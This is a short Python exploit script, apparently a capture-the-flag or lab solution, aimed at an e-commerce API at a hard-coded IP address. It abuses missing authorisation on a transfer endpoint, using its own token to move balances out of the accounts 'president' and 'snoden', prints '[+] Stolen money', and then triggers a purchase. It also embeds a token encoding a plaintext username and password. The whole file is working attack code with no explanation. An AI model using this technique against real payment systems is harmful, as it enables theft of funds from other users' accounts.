import requests 
send = "http://45.77.98.246:57777/ecommerce/action/sendbalance"
buy = "http://45.77.98.246:57777/ecommerce/action/buy"
username = "seculab"
targetAccount = ["president","snoden"]
targetBalance = [3000, 10000]
headers = {
    "usertoken" : "eyJpZCI6MzQsInVzZXJuYW1lIjoic2VjdWxhYiIsInBhc3N3b3JkIjoic2VjdWxhYiJ9",
}
for i in range (0, len(targetAccount)):
    body = {
        "from" : targetAccount[i],
        "to" : "seculab",
        "total" : targetBalance[i]
    }
    data = requests.post(send, headers=headers, json=body)
    print ("[+] Stolen money from ",targetAccount[i], " total ", targetBalance[i])

headersBuy = {
    "usertoken" : "eyJpZCI6MzQsInVzZXJuYW1lIjoic2VjdWxhYiIsInBhc3N3b3JkIjoic2VjdWxhYiJ9",
    "id" : "4"
}
buyData = requests.post(buy, headers=headersBuy)
print ("[+] BUY ACTIONS")
print (buyData.text)
